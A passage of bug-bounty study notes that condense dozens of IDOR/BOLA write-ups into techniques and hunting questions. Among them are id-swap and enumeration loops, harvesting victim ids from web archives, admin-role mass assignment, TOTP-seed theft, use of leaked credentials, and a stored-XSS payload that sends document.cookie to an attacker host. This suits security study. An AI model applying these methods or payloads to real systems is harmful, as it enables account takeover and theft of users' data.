- Lesson/Q (NOVEL): endpoints that take MULTIPLE ids (`userID`+`subscriptionID`) need ALL swapped together; harvest both from shared resources. Profile endpoints often leak API keys/secrets, not just PII → instant privesc. MongoDB ObjectIDs are not random (timestamp-prefixed).

### [61] THM classic "IDOR" room — Temitayo (reinforcement, good locations)
- `/profile?user_id=1305`→1000; ENCODED ids (base64decode.org → edit → base64encode.org); HASHED ids (md5("123")=202cb962… → crackstation.net to reverse); UNPREDICTABLE → 2 accounts swap. LOCATIONS: not just address bar — AJAX/XHR requests, JS files; PARAMETER MINING (unreferenced dev params, e.g. `/user/details` works on session, but add `?user_id=123`). Example API `/api/v1/customer?id={user_id}`. Tool: crackstation for hashed ids.

### [62] $1000 e-commerce order IDOR via Burp (reinforcement) — DevProgramming
- `GET /api/orders?order_id=56789` increment → other customers' PII. Workflow: Proxy→Repeater (single change) → Intruder Sniper (id list, sort by length/status) → Grep-Extract usernames. "IDOR often hides in overlooked endpoints: password resets, file uploads." Autorize for semi-auto detection.

### [63] BOLA write on "flows" + waybackurls ID harvesting — HBlack Ghost
- Habit: saved an interesting endpoint to notes during a privesc hunt, returned later. Create-flow request had `project_id` + `env_id`; 2 accounts → swap BOTH → created a flow inside another account. Raised severity by harvesting OTHER users' ids from archives: `echo host | waybackurls | grep -Po 'c-[a-zA-Z0-9]+' | cut -d - -f2 | anew` → Burp Intruder PITCHFORK with the harvested ids → created flows for many real users.
- Lesson/Q: harvest valid victim ids from `waybackurls`/`gau` with a regex for the id shape, then Pitchfork-pair them into the request. Keep a notes file of id-bearing endpoints to revisit. "What's the id PREFIX/shape, and can I grep it out of archived URLs?"

### [64] GraphQL IDOR on REVOKE (destructive mutation) — Yasmeen Rezk
- Feature: org owners generate activation tokens to invite members. Tested the FULL lifecycle (create→use→revoke). 2 accounts each generate a token; noted both token IDs. Intercepted the attacker's REVOKE GraphQL mutation → swapped attacker tokenID → victim tokenID → server revoked the victim's token (checks authn, not ownership); UI even attributes the action to the attacker.
- Lesson/Q: test IDOR on DESTRUCTIVE/state-change actions (revoke/cancel/disable/delete/deactivate), not just reads. Walk a feature's WHOLE lifecycle — the revoke/cancel step is frequently unguarded. "Does this revoke/cancel action verify I own the target, or just that I'm logged in?"

### [65] $800 order IDOR (human-readable ref) — Zoningxtr (reinforcement)
- `GET /api/v2/orders/ORD-2025-0142` (bearer) → `ORD-2025-0143` → other customer's full order (name,email,address,tracking) while still authed as user 7421. Human-readable sequential `ORD-YYYY-NNNN`. One safe minimal change to confirm; no mass scrape.

### [66] Meta IDOR via multi-ID-variant + handle→id resolver — Sancyty
- Custom-audience create request used an `"id"` (ig_business). The object response returned THREE id variants: `id`, `id_v2`, `legacy_id`. Authz guarded `id` (cross-account → "unauthorized"), but swapping in his own `id_v2` WORKED → then used a 2nd account's `id_v2` → created audience from another business. To prove impact (avoid "informative" with 0-user audience), needed victims' `id_v2`: found a typeahead/lookup GraphQL op (`xfb_partnership_ads…creator_account_info`, query=`<ig-username>`) that resolves ANY Instagram handle → its internal `id_v2` → used famous accounts → large audience size confirmed.
- Lesson/Q (NOVEL): when a response exposes MULTIPLE id formats (`id`/`id_v2`/`legacy_id`/uuid/slug), try EACH in the request — authz often guards only one variant. And hunt a search/typeahead/lookup endpoint that resolves a PUBLIC handle → INTERNAL id (your victim-id factory).

### [67] 57 IDORs in one codebase — systematic variant scanner — Iski
- `/api/user/12345/profile` sequential → count up (CEO, HR, finance profiles). Then scripted a scanner covering MANY variants: sequential numeric; UUID edge cases (null `00000000-…`, max `ffffffff-…`, one-char-off your own uuid); HPP (`user_id=me&user_id=victim`); JSON IDOR (`{"user_id":me,"target_user_id":victim}`, `{"current_user":..,"requested_user":..}`); GraphQL (`user(id:)`, `users(ids:[...])`); BATCH endpoints (`{"user_ids":[...]}`, `{"items":[{"id":..}]}`). Then: when ONE id-endpoint is vuln, test EVERY sibling for the same user (profile/settings/documents/billing).
- Lesson/Q: id-variant cheat-list — null/max/one-char-off UUID; batch endpoints with id ARRAYS; JSON bodies pairing current+target id. "If `/user/:id/profile` leaks, do `/settings`,`/documents`,`/billing` for that id too?"

### [68] ASP.NET login endpoint: drop creds, send only victim id → get their JWT — Hamit CİBO
- Digital-signature seller. `POST /Login/UserLoginViaCustomer/` body `Email&Password&CustomerId&UserId`. Suspicious that Password is sent here. Removing `CustomerId/UserId` → "token expired" (proves those drive it). Removing `Email/Password` but keeping victim `CustomerId/UserId` → response returned a valid Session + JWT for that id → decode at jwt.io → victim email, national ID, name. IDOR → session/token issuance = ATO.
- Lesson/Q (NOVEL): on login/session endpoints that take BOTH creds AND id params, the creds may be decorative — drop them and send only the victim's `CustomerId/UserId`; if you get a session/JWT back, that's an auth-bypass ATO. Identify the stack (ASP.NET) and target its sloppy param-handling patterns.

### [69] GUID IDOR — harvest victim's GUID via registration "already exists" — ALR
- Found hidden `/api/v2/User/Profile` by endpoint hunting. Probed path mutations: verb suffixes (`/add /remove /update`), `/{id}` positions, `v1`/`v2` swaps → mostly 404. Dropped the sub-resource: `/api/v2/User/{id-victim}` → returned user info, BUT id is a GUID (not enumerable). No endpoint mapped GUID from a number. TRICK: registered a new account using the VICTIM'S EMAIL → server's "user already exists" response leaked the victim's GUID → plugged it into the IDOR.
- Lesson/Q (NOVEL): when an IDOR needs an unguessable GUID/UUID, harvest it from the REGISTRATION/forgot-password/invite flow — submitting the victim's email often returns their internal id or confirms existence. Also restructure the path: drop the sub-resource, move `/{id}`, swap API version. "Where does the app hand me another user's opaque id for free (register, invite, share, mention, error message)?"

### [70] Cross-tenant id reuse → delete any user in another org — InsbatArshad
- Multi-org SaaS. User IDs are GLOBAL: the same person has the SAME user id in every org. Attacker = admin of ORG B, only a normal user of ORG A. Invited the victim into ORG B → invite response disclosed the victim's global user id. Took a privileged `DELETE /api/access/manager/customer/{orgB}/user/{attacker-controllable}` from ORG B, swapped org id B→A and user id→victim → victim deleted from ORG A where attacker had no admin rights.
- Lesson/Q (NOVEL): test cross-TENANT id reuse — do a privileged action in a tenant you control (admin), then repoint both the tenant/org id AND the object id at a tenant you don't. Invitation/membership responses leak global user ids. "Is this id the same across orgs? Can I perform an admin action in my org but aim it at another org's id?"

### [71] PUT blocked, GET wide open — HTTP method swap — Yosefmostef
- `PUT /webapi/3.9/users/{id}`; swapping id → "unauthorized". Changed the METHOD PUT→GET on the same path → returned another user's data (fewer fields, still sensitive: lastModified, timezone, subscriptionPlan, and a `timestamp` used in token/sig generation).
- Lesson/Q: when the original verb is access-controlled, replay the SAME id-bearing path with every other method (GET/POST/PUT/PATCH/DELETE/HEAD/OPTIONS) — authz is frequently bound to one verb only. Treat "minor" fields (timezone, plan, server timestamps feeding tokens) as sensitive.

### [72] Financial-state IDOR with no PII still valid — Sri Sowmya Nemani
- `GET /sorting_hat/v4_web` (Bearer) JSON body `{"account_number":"12345"}`; change to `"7000"` → 200 with another account's financial lifecycle state (funded / in review / rejected / deposit pending). No names/emails, but state leakage is a privacy + compliance (GLBA/GDPR) issue; enumerable numeric key enables dataset building.
- Lesson/Q: an IDOR that leaks only STATUS/STATE (approved/rejected/pending/tier/balance-band) is still reportable. Numeric `account_number` in a JSON body is a prime enumerable key. "Even with no PII, does this expose a per-user status I shouldn't see?"

### [73+75] Hashed-id IDOR + Caido/ffuf fuzzing (THM Corridor) — Trixia Horner [consolidated 2 posts]
- Corridor room: every page is hidden behind an MD5 HASH in the URL path. Recognized hex in URL → `hashid`/`hashcat` to ID the algo → realized they're just `md5(sequential integer)`. Built wordlist: `for i in $(seq 0 100); do echo -n $i | md5sum | awk '{print $1}'; done > hashes.txt`. Fuzzed the hash position with Caido Automate (placeholder + hosted file) or ffuf. Oracle: most return 404; among the 200s, the one with a LARGER response Length is the hidden/flag room.
- Lesson/Q (NOVEL): when an "opaque" id is actually a HASH (hex), don't assume it's safe — identify the algorithm and test if it's `hash(sequentialInt)` or `hash(predictable: email/username/userid)`. If so, precompute hashes across a range and fuzz them. A hashed id with a small/guessable input space is NOT access control. When all responses share a status code, sort by response LENGTH to find the anomaly. "Is this random-looking id really just hash(something I can enumerate)?"

### [74] Mass-assignment role injection + DevTools endpoint discovery — Imran Niaz
- Discovered endpoints via browser DevTools Network tab (faster than big wordlists). `POST /api/users` accepted `{"username","email","password","role":"admin"}` — app enforced security only on the FRONT END, backend trusted the `role` field → created an admin (privilege injection). Audit map: `GET /api/users`=unauth enumeration, `DELETE /api/users/:id`=BAC, `PUT /api/users/:id`=role escalation, `POST /api/users`=privilege injection. Noted 24-hex ids (`68b5cd6567c688e1750fcee6`) = Mongo ObjectIds.
- Lesson/Q: in create/update bodies, try mass-assigning a privileged field (`role:admin`, `isAdmin:true`, `verified:true`) — front-end-only validation means the backend accepts it. Use DevTools as a quick endpoint source. Mongo ObjectIds embed a timestamp prefix (partially predictable). "Does the backend re-check the role/owner fields, or just trust what the client sent?"

### [76] Primer: URLs betray you (conceptual) — Natarajan C K [reinforcement]
- Cinema-ticket analogy for IDOR (`/order?id=12345`→`12346`). Defenses: per-request ownership check, indirect references (random tokens/hashed refs), enforce authz everywhere. No new finding; reinforces the core mental model + 403-handling nuance.

### [77] €2000 IDOR→PrivEsc via HIDDEN 4th role UUID in roles response — Ashar Mahmood
- Admin dashboard role-change sent the role as a UUID (not a string): `POST /edit/user/roles {"Role":"<uuid>"}`. Searched Burp history for that UUID → found an automated `GET /get/user/roles` whose response listed FOUR role UUIDs, but the UI only offered three (User/Admin/Partner). The 4th UUID was an internal-employee role never exposed in the UI. Swapped the hidden UUID into the role-change request → 200 OK → gained edit/add/delete over 12 internal employees + special System/Hosting accounts; user count jumped 26→40. "Never overlook Burp HTTP history — automated GET requests leak values the UI hides."
- Lesson/Q (NOVEL): when roles/permissions are referenced by UUID, find the endpoint that LISTS all role UUIDs (`/get/user/roles`) — it often returns MORE roles than the UI shows. Plug each undisclosed role/permission id into the assignment request. "Does any list/enum endpoint return objects (roles, plans, features, statuses) that the UI deliberately hides from me?"

### [78] $2500 nested-id IDOR — find it in NEW features via changelog — L4zyhacker
- Strategy: skip the well-trodden bugs on a mature (bank) target; hunt NEW scope/features instead — find them via the program changelog (HackerOne → Help → Changelog) or Google `site.com what's new`. Bug: `/org/<org-id>/blah/<blah-id>` — devs carefully restricted `org-id` but FORGOT to restrict the inner `blah-id`; swapping only `blah-id` to the victim's worked.
- Lesson/Q (NOVEL): in nested/compound paths, the OUTER id (org/tenant/account) is usually access-controlled but the INNER id (resource) often is not — change only the inner id while keeping your own outer id. Prioritise newly-shipped features (changelog/"what's new") where authz is least battle-tested. "Which id in this path did they forget to check — the inner one?"

### [79] $125 campaign edit IDOR + CSRF-token drop — Tanvir Ahmed
- Two accounts. Created a campaign in A, noted its `id`. In B, started an edit, captured the request, swapped the campaign `id` A↔B AND removed the CSRF token → A's campaign edited. CSRF validation was optional (removing the token bypassed it instead of failing).
- Lesson/Q: combine the id swap with CSRF-token removal — if the server only validates a token when present, dropping it bypasses the check. Test WRITE actions cross-account, not just reads. "If I delete the CSRF/auth token entirely (vs. tampering it), does the request still succeed?"

### [80] Member deletes Owner via GraphQL batch mutation — Ashish Rai
- Enterprise SaaS. `POST /api/graphql?company_id=...` calling `useBatchRemoveCompanyMembersMutation` with `variables.memberIds:["<ownerId>"]`. A low-priv Member could remove the org OWNER (no server-side role check in the resolver). Self-evidence: after deleting the owner the attacker's own session started returning 403 (proved the privileged action executed). Org takeover.
- Lesson/Q: target DESTRUCTIVE GraphQL mutations (`*Remove*`, `*Delete*`, batch `*Members*`) as a low-priv user and aim them at HIGHER-privilege victims (Owner/Admin). Batch endpoints take id ARRAYS — drop any id in. "Can a Member invoke the resolver that removes/edits an Owner?"

### [81] MFA bypass — IDOR returns victim's TOTP seed in the QR — Shrivarshan (NOVEL/HIGH-VALUE)
- Enabling MFA sent `POST /api/auth/mfa {"userId":211}` (own id). Swapped to another fresh account id (220) → enabled MFA for them from attacker's session. JACKPOT: the MFA-setup JSON response contained `"qrimage":"<base64 PNG>"`. Decoded it (`base64 -d > qr.png`) and read the QR (ZXing) → `otpauth://totp/victim@host?secret=<SEED>`. That TOTP seed lets the attacker generate ALL future OTPs for the victim → full ATO even on MFA-ENABLED accounts (re-sending `{"userId":212}` for an already-enrolled user still returned a fresh QR/seed).
- Lesson/Q (NOVEL): on MFA/2FA-setup endpoints, swap the `userId` and INSPECT THE RESPONSE for a QR image / `otpauth://` URI / `secret`. A returned TOTP seed = complete MFA bypass. Always base64-decode image blobs in responses and parse any QR for embedded secrets. "Does the 2FA-enroll response hand me the victim's seed? Does it re-issue a seed for an already-enrolled victim?"

### [82] CERT-EU: crafted-URL IDOR (token splice + path traversal) chained to email-verif bypass — Vashu Vats (NOVEL)
- Flaw 1: built a malicious URL by SPLICING tokens from two flows — took the `<reset_token>` from a password-reset link and substituted it for the `<verification_token>` in the registration-verify URL, then changed the 6-digit (brute-forceable) numeric id to the victim's: `…/registration/../<victim_id>/../<reset_token>` → server returned the victim's PII / confirmed account existence (leaked email local-part). Flaw 2: email update applied WITHOUT verification → attacker sets their account email to the victim's → if victim later registers they're blocked (DoS / pre-emptive account claim); multiple attacker accounts could even share one victim email.
- Lesson/Q (NOVEL): try cross-splicing tokens between flows (reset token where a verify token is expected) and using `../` path segments to reshape an id-bearing URL. Small numeric ids (6-digit) are brute-forceable. Test whether email-change requires re-verification — if not, you can squat/claim victim emails. "Can a token from flow A be replayed into flow B's URL? Is the account id in this link guessable?"

### [83] Autorize automation methodology — Abdul Mateen [reinforcement]
- Burp BApp `Autorize` (needs Jython jar). Paste the LOW-priv user's session cookie into "Headers to Replace", then browse the whole app as the HIGH-priv/admin user; Autorize silently replays every request with the low-priv token and flags access-control gaps. Red "Bypassed" = likely IDOR/BAC → manually confirm before reporting. Scales access-control testing across 100+ endpoints without manual A/B replay.
- Lesson/Q: run Autorize on every authenticated session to get blanket BAC coverage; "Bypassed"/"Is enforced???" rows are your triage queue. Always manually verify a "Bypassed" hit.

### [84] Source-code-review primer: invoice IDOR + client-side-only checks — Anya Forger (ID) [defensive]
- Code-review lens (PHP lab): `$_GET['invoice_id']` passed straight into the DB query with NO ownership check → swap `invoice_id` to read others' invoices. Fix: `WHERE id=? AND user_id=$_SESSION['user_id']` (return nothing/abort if the id+owner combo doesn't match). Also: hardcoded `user_id=1` (no session) = everyone treated as user 1; price/`ticket_money` validated only client-side → buy for less/free; predictable/reusable OTP; a Base64 token in a 302 `Location: valid.php?code=...` was identical every checkout (server didn't bind it to price/balance) → access the OTP/confirm URL directly to skip balance validation.
- Lesson/Q (DEFENSIVE + offensive): the secure query pattern is the tell — if ownership isn't in the WHERE clause it's IDOR. Base64 params in redirect `Location` headers are tamperable and often static; decode and test reuse. "Is the object id query scoped to the session user? Is this token bound to the transaction or reusable?"

### [86] DUP of [78] — L4zyhacker member-only mirror (same $2500 nested-id IDOR). No new content (this URL even links to [78] as the "free blog"). [duplicate]

### [87] $3K IDOR→account-brick via invalid state value — matrixm0x1 (NOVEL impact)
- Found `PUT /<api>/applicant/{user_id}/onboarding-step` referenced in a JS bundle (`main.min-*.bundle.js` → `/applicant/${this.userId}/onboarding-step`). Swapped own user_id→victim (guessable) → reset victim's onboarding progress (basic IDOR, 200 OK). ESCALATION: sent `onboarding_step=0` (an invalid state) for the victim → on next login the victim is force-redirected to `/onboarding` in an infinite reload loop, no dashboard, no self-recovery → account soft-locked (needs support). IDOR + logic flaw = persistent DoS.
- Lesson/Q (NOVEL): after a basic write-IDOR, push impact by writing INVALID/edge values (0, negative, null, out-of-range enum, huge) into the victim's record to corrupt their state and brick the account — a far higher-severity DoS than a benign field change. Mine JS bundles for the exact id-bearing endpoints. "What invalid value would put this victim record into an unrecoverable state?"

### [88] Critical IDOR chain (read→discover role ids→write self-admin) via JS recon — B0d4
- Used the FindSomething extension to pull API endpoints + their JS wrapper functions from JS files. Found `getUserRoles(userId)` → `GET /identity-management/user-details/{userId}` with INCREMENTAL ids (IDOR #1: enumerate every user's details+roles; fuzz up to find the admin → admin role id = 1). Found `updateUser` → `POST /identity-management/update-user` body `{user_id, roles_to_be_added:[], roles_to_be_removed:[], status:"active|disabled"}` (IDOR #2). Sent `{user_id: MINE, roles_to_be_added:[1], status:"active"}` → re-login → admin dashboard. The `status` field also lets you activate/deactivate ANY account (incl. admins).
- Lesson/Q (NOVEL): read the JS WRAPPER FUNCTIONS, not just URLs — they reveal exact param names/shapes (`roles_to_be_added`, numeric role ids). Chain a READ-IDOR to enumerate victims and discover privileged role ids, then a WRITE-IDOR to grant yourself that role. Look for a `status`/`enabled` field = bonus account-disable DoS. "Does a JS function hand me the request body schema? Can I read role ids via one IDOR and assign them via another?"

### [85] Primer + mitigations (PT) — Alexandre Santos [reinforcement/defensive]
- Solid OWASP-aligned primer. Useful offensive nuggets: filename-based IDOR `/api/files/download?file_id=relatorio_joao.pdf` (human-deducible filenames), `/api/v1/statement/45678`, `/api/issues/12345`. Defenses: server-side per-request authz (403 on mismatch), unpredictable ids (UUID), client→backend reference MAPPING (indirect references), least privilege. Reinforces predictability + verb-sensitivity (PUT/POST/DELETE enable modify/delete IDORs).

### [89] Unauth public API → chain leaked IDs across endpoints (virtual school) — HBlack Ghost
- Found an endpoint returning ALL schools' info (incl. staff details + their IDs) with NO authentication; data scoped by REGION (request from Egypt → Egyptian schools). Extracted school IDs from that response → fed them into a per-school detail endpoint → full school data. Then dug in Burp for another request → teachers endpoint leaking names/locations/school-IDs/PII/photos by changing IDs.
- Lesson/Q: an unauthenticated LIST endpoint is an id factory — harvest ids from it, then pivot them into detail endpoints (school→teacher). Region/geo headers may gate which dataset you see (try other regions). "Is there an unauth list endpoint whose ids unlock authed detail endpoints? Does changing my region/locale expose a different tenant's data?"

### [90] $5375 Meta — CRUD secure, but SHARE-LINK sub-service is IDOR — Sancyty (NOVEL)
- FB Business Manager → Campaign Planner. Methodically mapped the app into nodes/sub-nodes/services. IDOR-tested all CRUD on campaign plans → all SECURE. But a SUB-SERVICE that creates SHARE LINKS was vulnerable: capture the share-link-create request, swap the campaign-plan ID (account A→B) → received a working share link to the OTHER account's private plan.
- Lesson/Q (NOVEL): when primary CRUD is locked down, attack the SECONDARY actions — share-link, export, print, embed, duplicate, invite, preview — they often skip the ownership check the main endpoints enforce. Map every sub-service of a feature, not just the obvious endpoints. "They secured read/edit — did they secure SHARE/EXPORT/DUPLICATE of the same object?"

### [91] Vendor/tenant-id IDOR in POST body (+ blank-value test) — Blue_eye
- Ride-hailing vendor admin panel. `POST /api/vendor/drivers` body `{"start":10,"limit":10,"vendorId":"23","search":"","hotspotId":"",...}`. Changed `vendorId` 23→24 → other vendors' driver PII (name, mobile, DL number, full contact). Also tried `vendorId:""` (blank) — classic test that can return ALL records / cross-tenant data.
- Lesson/Q: a `vendorId`/`tenantId`/`orgId`/`companyId` in a JSON body is a horizontal-IDOR magnet. Beyond ±1, test BLANK/empty, `null`, `0`, `*`, and arrays — empty often disables the filter and dumps everything. Pagination bodies (`start`/`limit`) hint at bulk data behind the id. "What if I blank out the tenant filter entirely?"

### [92] IDOR report-writing template — Nile Okomo [methodology/reporting]
- Clean reusable report skeleton for an IDOR: Title (Unauthorized X via `param` on host) → Description w/ CWE-639 → Vulnerability Discovery → PoC (show the legit request `GET /profile?user_id=1` AND the tampered `user_id=2` side by side, with expected vs observed output) → Exploitation Steps (numbered) → Impact (horizontal privesc / data exposure) → Remediation (indirect refs/UUID + server-side validation) → Severity. 
- Lesson/Q: a strong IDOR report shows the BASELINE (your own id) and the TAMPERED request with the unauthorized data returned — the diff IS the proof. Keep this structure for every IDOR submission.

### [93] HTB: encoded (base64) reference IDOR — read JS, replicate encoding — Ihouele Caurcy (NOVEL technique)
- `GET /download.php?contract=MQ%3D%3D` — not a plain id. Page JS: `downloadContract(uid){ location="/download.php?contract="+encodeURIComponent(btoa(uid)); }`. Reversed: URL-decode `MQ%3D%3D`→`MQ==`, base64 -d → `1`. So the ref = `urlencode(base64(uid))`. Replicated for every id (`echo -n $i | base64 -w0`) and mass-enumerated 1..20 → flag in user 20.
- Lesson/Q (NOVEL): when a param looks encoded/opaque, DECODE it (base64/hex/URL/JSON) and read client JS for the encode function (`btoa`, `encodeURIComponent`, custom). Reproduce the exact transform to mint valid refs for any id. Encoding ≠ encryption ≠ access control. "Can I decode this token, find the encode logic in JS, and re-encode arbitrary ids?"

### [94] HTB: mass IDOR enumeration + POST-vs-GET + follow-the-links — Ihouele Caurcy
- Docs app: no id in URL. JS `getDocuments(uid){ $.redirect("/documents.php",{uid},"POST") }` → it's a POST with `uid` in the body (GET `?uid=` did nothing). `POST /documents.php uid=1` returns HTML listing that user's files; `uid=2` → different files. Bash-enumerated 1..20, grep `\/documents\/[^']*\.(pdf|txt)` from each response, wget each. The flag file had an UNGUESSABLE hash name (`flag_11dfa168...txt`) — impossible to brute by filename, but it was LINKED in user 11's listing.
- Lesson/Q: always try POST and GET (and other verbs) — apps handle them differently. Don't brute unguessable filenames; instead enumerate the INDEX/list endpoint per id and follow the links it returns. Response-LENGTH variance in Intruder flags which ids have extra/unique content. "Does the per-id listing leak links to files I could never have guessed?"

### [96] Why IDOR persists — RBAC ≠ object-level authz — Aravind S V [reinforcement/defensive]
- Key insight: role-based checks (user is an "employee") are NOT object-level checks (this employee may access THIS record). Access must be scoped to ownership/relation, not just role. IDOR survives because authz is decentralized across microservices, devs over-trust client constraints, and scanners lack user context so they can't know what "should" be inaccessible. Test method: log in as multiple users and swap IDs — think curious, not just malicious.
- Lesson/Q: even on RBAC apps, test object-level access within the SAME role (employee A → employee B's record). "RBAC passed — but is access scoped to the specific object's owner, or just to my role?"

### [95] Simple IDOR test method + where-to-look checklist — Ekene Joseph [methodology]
- Step method: (1) find object refs (`user_id`, `invoice=`, `file=`, `/profile/123`, `/order/1098`, `/download/321`); (2) change the value; (3) read response (200+different data=vuln; 401/403/redirect=likely safe); (4) Burp Repeater for clean A/B; (5) report. Bonus where-to-look: test BOTH GET and POST, inspect hidden fields/headers/body, hit file downloads, password-reset tokens, invoices, messages with YOUR token; watch for sequential ids. Real example: `banksite.com/invoices/3109`→`3110` = another user's invoice → $3,000.
- Lesson/Q: maintain a target inventory of every id-bearing parameter/route and systematically swap each. "Have I tried this same id swap on downloads, reset tokens, invoices, AND messages — not just profiles?"

### [97] Chaining OSINT (leaked creds) → IDOR + RCE — Jawad Mahdi (NOVEL recon)
- On a pentest with NO valid creds, used an OSINT leaked-credential source (e.g. osintleak) to obtain working logins → unlocked authenticated functionality (authn testing is half the job). Inside: RCE via a user-level file-upload, AND an IDOR leaking user PII. Discovered endpoints by manual testing + Burp's GAP extension (endpoint/param discovery from JS).
- Lesson/Q (NOVEL): if you can't register/auth, source leaked credentials via OSINT to reach the internal attack surface where most IDORs live. Use Burp GAP to mine endpoints from JS. "Is the juicy IDOR behind a login I could enter with OSINT-sourced creds? What endpoints does GAP surface that the UI never links?"

### [99] Member-only primer (partial) — Hussein Reda [primer/partial]
- Generic IDOR definition + `https://example.com/profile?user_id=12345` example; emphasises the app failing to verify authorization for the SPECIFIC resource (view/edit someone else's account by supplying its identifier). Member-only, body truncated; no unique finding. Concept already covered by other cards.

### [100] Invite/parentid IDOR → join victim's account as partner (ATO) — Ali Razzaq (NOVEL)
- B2B wholesaler ecommerce with an invite feature. The invite request carried `parentid` = the ATTACKER's account id. Changed `parentid` → victim's id → the invitation email was sent FROM the victim's account to the attacker's own email. Attacker opened it, set up the sub/partner account, and logged in linked UNDER the victim → full access to victim's orders + personal details (address, phone).
- Lesson/Q (NOVEL): in invite/team/parent-child/sub-account flows, swap the `parentid`/`ownerId`/`accountId` to a victim's — you may get attached to their account as a partner/member (an ATO-equivalent). Send the invite to YOUR OWN email so you control acceptance. "Whose account does this invite bind me to, and can I change the parent id to a victim?"

### [98+101] Canonical THM IDOR room taxonomy — Orion / Willy Chen [consolidated, methodology]
- The foundational id-type playbook: (1) BASIC numeric: `?user_id=1305`→`1000`; (2) ENCODED ids: usually base64 — decode (base64decode.org) → edit → re-encode → resubmit; (3) HASHED ids: may just be hash(integer) e.g. md5("123")=`202cb962ac59075b964b07152d234b70` → run through crackstation.net; (4) UNPREDICTABLE ids: make 2 accounts and swap ids (works even unauthenticated = stronger); (5) WHERE they live: not just the address bar — AJAX/XHR calls, endpoints referenced in JS files, and DEV-LEFTOVER params. PARAMETER MINING: an endpoint like `/user/details` (session-scoped) may accept an unreferenced `?user_id=123` → other users. Practical: `/api/v1/customer?id=1`→`3` returns each user's JSON.
- Lesson/Q: classify every id (numeric / base64 / hex / hash / uuid) and apply the matching attack. Mine hidden params (`id,user_id,account,doc_id,uuid`) on session-only endpoints. "Is this 'random' id base64 or md5(int)? Does adding a user_id param to this 'me' endpoint leak others?"

### [102] Hotel-room analogy primer — Tracey M [reinforcement]
- Clean beginner mental model: IDOR = a hotel that opens any room if you know the number, never checking your key. Each request must ask "Is THIS user authorized for THIS object?" not just "is the id valid?". Impacts: privacy, data theft, ATO, GDPR/HIPAA. Reinforces the per-object authorization principle.

### [103] IDOR (widget) + javascript: URI stored XSS → ATO — Yahia Sherif (NOVEL chain)
- SaaS widget builder; config via GraphQL `UpsertWidgetHomepage` with id `widgetHomepageUuid`. The UUID was LEAKED in the public iframe HTML of the customer's embedded widget (so "unguessable" didn't matter). Made a 2nd account, replayed the upsert with the victim's `widgetHomepageUuid` → 200 → edited the victim's live widget (phone/email/image/link). To raise impact past P4, tested XSS: inputs were hardened EXCEPT the `custom_link` URL accepted a `javascript:` URI → `javascript:fetch('attacker-host',{method:'POST',mode:'no-cors',body:document.cookie})` → stored XSS on the public page → cookie theft → ATO.
- Lesson/Q (NOVEL): "unguessable" UUIDs are routinely LEAKED in public iframe/embed HTML, share pages, sitemaps, OG tags — grep the public-facing page for the id. Escalate an IDOR that controls victim-rendered content into stored XSS by testing the FORGOTTEN `javascript:` URI scheme in link/URL fields. "Is this object's uuid printed anywhere public? Can the content I now control via IDOR carry a javascript: payload?"

### [104] $6000 — delete any SSO user; passwordless makes the "secret" param a constant — Zephyrus (NOVEL)
- `POST /api/delete/account {"email","authPw"}` (authPw = password hash). Swapping email+authPw deleted the victim but required the victim's hash. Breakthrough: for SSO/passwordless accounts NO password is set, so `authPw` is an identical default for everyone — attacker keeps their OWN authPw, swaps only `email`→victim → deletes any passwordless user knowing just their email. Reframing the PoC to drop the secret dependency turned Informative→Low→High ($6000).
- Lesson/Q (NOVEL): when a destructive request includes a secret/credential-derived param (`authPw`, password hash, security answer), check whether SSO/passwordless users share a constant/empty value for it — then the secret is meaningless and only the email/id matters. "Do SSO users have a null/identical value for this 'secret' field, collapsing it to a non-secret?"

### [105] Predictable short-link enumeration IDOR + SMS message injection — Vikas Anand (NOVEL)
- ID-verification flow. Bug A (message injection): `POST /api/v1/verification/send-sms {"to_phone_number","url"}` — controlled BOTH → sent an arbitrary (phishing) URL to ANY phone number → mass smishing; the platform's URL shortener even obfuscated it. Bug B (IDOR): the document-upload links were shortened with a PREDICTABLE ascending pattern (`/aa`,`/ab`,`/ac`…) → enumerated active links → reached other users' ID-verification/document-submission pages → upload identity docs on their behalf (hijack/lock-out verification).
- Lesson/Q (NOVEL): URL-shortener / short-code links are an IDOR surface — if the codes are sequential (`aa,ab,ac`/base36 counter), enumerate them to reach other users' resources. On any "send link/notify" endpoint, try controlling BOTH the recipient AND the URL/content = message injection at scale. "Are these short codes sequential? Can I set both the recipient and the link on this notify endpoint?"

### [106] Recon-amplified IDOR → 100s of credit cards; harvest IDs from wayback + EXPIRED JWTs — Bhagavan Bollina (NOVEL/HIGH-VALUE)
- Cookie `cam=` held an id reused as `external_customer_id` in backend calls. 2 accounts → `GET /credit_cards/v1/` with victim's `external_customer_id` → full card number (via card token), expiry, default-card status. AMPLIFY: ran `waybackurls` + `gau` over the domain → archived/indexed `reset-password` URLs contained JWT tokens & query params with `external_customer_id`/`externalCustomerId`. The JWTs were EXPIRED but still DECODABLE (Burp Decoder) → harvested many real users' ids → mass IDOR across hundreds of customers (live financial data → critical).
- Lesson/Q (NOVEL): to prove mass impact, harvest victim ids from ARCHIVES (`waybackurls`,`gau`, Common Crawl) — reset-password, referral, and email-tracking URLs leak ids and bypass access control. EXPIRED JWTs are still useful: decode the payload for `sub`/customer ids even if you can't authenticate. Cookies often mirror the backend id (`cam=` → `external_customer_id`). "Where are user ids archived publicly, and can I decode expired tokens for more ids?"

### [107] $4500 IDOR→ATO — path blocked, query-param variant open — Foysal Ahmed Fahim (NOVEL)
- `/api/v2/users/[victim_id]` (path) → 401. Bypass attempts failed: `/api/v1/...`, `/users/users/../[id]`, trailing `~`. Kept browsing in Burp and caught a DIFFERENT shape of the same resource: `/api/v2/users?id=` (QUERY param). `?id=victim_id` → returned victim data AND linked the attacker account to the victim → password reset → full ATO.
- Lesson/Q (NOVEL): the SAME resource is often reachable via multiple shapes — path `/users/{id}` vs query `/users?id=` vs body `{"id":...}` vs header. Authz may be enforced on ONE shape only; enumerate all of them. Don't stop at a 401 on the path variant — hunt the query/body/legacy variant. "Is there another route shape to this object whose authz check is missing?"

### [108] Advanced IDOR-in-2025 technique catalog — Santhosh Adiga U (HIGH-VALUE methodology)
- Where modern IDOR hides: mobile APIs (`/v2/me/update`), GraphQL resolvers, microservice internal-trust, async jobs (reset/export), file preview/upload, admin impersonation/RBAC. Techniques:
  • JWT Binding Bypass — body carries `user_id`/`email` but backend never checks it against the token's `sub` → swap to victim.
  • Cross-Endpoint Object Reuse — grab an id from `/api/notifications` (`message_id`) and use it on `/api/messages/{id}`; auth validated on one endpoint, not the other.
  • Async Action IDOR — queues/lambdas check auth at SUBMISSION not EXECUTION; replay `POST /reset-password {user_id:victim,...}`.
